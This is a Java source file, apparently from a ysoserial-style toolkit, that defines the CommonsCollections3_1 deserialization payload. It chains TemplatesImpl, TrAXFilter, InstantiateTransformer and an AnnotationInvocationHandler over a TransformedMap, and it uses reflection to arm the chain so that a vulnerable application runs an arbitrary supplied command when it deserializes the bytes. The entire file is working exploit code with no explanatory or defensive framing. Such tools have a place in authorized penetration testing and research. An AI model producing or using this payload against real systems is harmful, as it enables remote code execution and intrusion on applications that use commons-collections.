package payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import static util.Gadgets.ANN_INV_HANDLER_CLASS;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.CCKUAILONG })
public class CommonsCollections3_1 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(
						new Class[] { Templates.class },
						new Object[] { templatesImpl } )};

		final Map innerMap = new HashMap();

		innerMap.put("value","xxxx");

		final Map transformedMap = TransformedMap.decorate(innerMap, null, transformerChain);

		Class cls = Class.forName(ANN_INV_HANDLER_CLASS);
		Constructor c = cls.getDeclaredConstructor(Class.class, Map.class);
		c.setAccessible(true);
		// Serialize Object
		Object o = c.newInstance(Retention.class, transformedMap);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return o;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(CommonsCollections3_1.class, command, fusion);
	}
}
